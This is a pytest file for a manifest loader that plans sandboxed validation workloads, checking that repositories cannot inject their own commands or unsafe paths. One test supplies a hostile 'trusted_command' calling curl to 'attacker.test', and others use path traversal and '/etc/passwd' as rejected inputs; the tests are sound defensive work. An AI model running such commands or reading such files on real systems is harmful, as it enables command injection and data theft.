import json
from pathlib import Path

import pytest

from contracts import RepositoryContext
from lou.repository.workloads import (
    MANIFEST_PATH,
    MAX_MANIFEST_BYTES,
    fixture_workload_registry,
    load_workload_registry,
    plan_validation_workloads,
)

FIXTURE_MANIFEST = (
    Path(__file__).resolve().parents[3]
    / "fixtures"
    / "broken-store"
    / "template"
    / ".lou"
    / "workloads.json"
)

PYTEST_WORKLOAD = {
    "id": "api-pytest",
    "type": "pytest",
    "path": "tests/test_api.py",
    "estimated_cost_seconds": 20,
    "criteria": [{"source": "affected_tests", "value": "tests/test_api.py::", "match": "prefix"}],
}


def _write(repository: Path, document: object) -> Path:
    manifest = repository / MANIFEST_PATH
    manifest.parent.mkdir(parents=True, exist_ok=True)
    manifest.write_text(json.dumps(document), encoding="utf-8")
    return repository


def _manifest(*workloads: dict[str, object]) -> dict[str, object]:
    return {"revision": "app-v1", "workloads": list(workloads)}


def test_the_shipped_fixture_manifest_reproduces_the_registry_it_replaced(tmp_path: Path) -> None:
    """The demo must run through the general path, not a special case beside it."""

    target = tmp_path / MANIFEST_PATH
    target.parent.mkdir(parents=True)
    target.write_text(FIXTURE_MANIFEST.read_text(encoding="utf-8"), encoding="utf-8")

    assert load_workload_registry(tmp_path) == fixture_workload_registry()


def test_any_repository_can_declare_its_own_workloads(tmp_path: Path) -> None:
    registry = load_workload_registry(_write(tmp_path, _manifest(PYTEST_WORKLOAD)))

    assert registry.revision == "app-v1"
    assert [entry.workload_id for entry in registry.entries] == ["api-pytest"]


def test_a_declared_workload_is_selected_from_matching_graph_evidence(tmp_path: Path) -> None:
    registry = load_workload_registry(_write(tmp_path, _manifest(PYTEST_WORKLOAD)))
    context = RepositoryContext(
        repository_id="app",
        commit_sha="a" * 40,
        affected_tests=["tests/test_api.py::test_create"],
        completeness=1,
    )

    plan = plan_validation_workloads(context, registry)

    assert [item.workload_id for item in plan.selected] == ["api-pytest"]


def test_a_repository_declaring_nothing_yields_an_empty_registry(tmp_path: Path) -> None:
    registry = load_workload_registry(tmp_path)

    assert registry.entries == ()


def test_a_manifest_cannot_choose_what_runs_in_the_sandbox(tmp_path: Path) -> None:
    """The command is Lou's, derived from the type; repository text never supplies argv."""

    hostile = {**PYTEST_WORKLOAD, "trusted_command": ["curl", "http://attacker.test"]}
    registry = load_workload_registry(_write(tmp_path, _manifest(hostile)))

    assert registry.command_map() == {
        "api-pytest": (
            "python",
            "-m",
            "pytest",
            "-q",
            "-p",
            "no:cacheprovider",
            "tests/test_api.py",
        )
    }


def test_a_k6_workload_carries_registry_owned_load_settings_and_no_command(tmp_path: Path) -> None:
    load = {
        "id": "api-k6",
        "type": "k6",
        "path": "loadtests/api.js",
        "estimated_cost_seconds": 60,
        "criteria": [{"source": "affected_endpoints", "value": "POST /orders"}],
    }
    registry = load_workload_registry(_write(tmp_path, _manifest(load)))

    entry = registry.entries[0]
    assert entry.trusted_command is None
    assert entry.trusted_load is not None
    assert registry.command_map() == {}


@pytest.mark.parametrize(
    ("workload", "reason"),
    [
        ({**PYTEST_WORKLOAD, "type": "custom"}, "Lou cannot run a custom type"),
        ({**PYTEST_WORKLOAD, "path": "../outside.py"}, "path escapes the repository"),
        ({**PYTEST_WORKLOAD, "path": "/etc/passwd"}, "absolute path"),
        ({**PYTEST_WORKLOAD, "criteria": []}, "no graph evidence would ever select it"),
        ({**PYTEST_WORKLOAD, "id": "Not Valid"}, "workload id is malformed"),
        ({**PYTEST_WORKLOAD, "estimated_cost_seconds": 0}, "cost must be positive"),
        ({**PYTEST_WORKLOAD, "criteria": [{"source": "invented", "value": "x"}]}, "unknown source"),
    ],
)
def test_an_unsafe_or_unrunnable_declaration_is_rejected(
    tmp_path: Path, workload: dict[str, object], reason: str
) -> None:
    with pytest.raises(ValueError):
        load_workload_registry(_write(tmp_path, _manifest(workload)))


@pytest.mark.parametrize(
    "document",
    [
        [],
        {"workloads": []},
        {"revision": "", "workloads": []},
        {"revision": "app-v1"},
        {"revision": "app-v1", "workloads": {}},
        {"revision": "app-v1", "workloads": ["not-an-object"]},
    ],
)
def test_a_malformed_manifest_is_rejected(tmp_path: Path, document: object) -> None:
    with pytest.raises(ValueError):
        load_workload_registry(_write(tmp_path, document))


def test_unreadable_json_is_rejected(tmp_path: Path) -> None:
    manifest = tmp_path / MANIFEST_PATH
    manifest.parent.mkdir(parents=True)
    manifest.write_text("{not json", encoding="utf-8")

    with pytest.raises(ValueError, match="readable JSON"):
        load_workload_registry(tmp_path)


def test_an_oversized_manifest_is_rejected_before_parsing(tmp_path: Path) -> None:
    manifest = tmp_path / MANIFEST_PATH
    manifest.parent.mkdir(parents=True)
    manifest.write_text(" " * (MAX_MANIFEST_BYTES + 1), encoding="utf-8")

    with pytest.raises(ValueError, match="exceeds"):
        load_workload_registry(tmp_path)


def test_duplicate_declared_ids_are_rejected(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="duplicate"):
        load_workload_registry(_write(tmp_path, _manifest(PYTEST_WORKLOAD, PYTEST_WORKLOAD)))
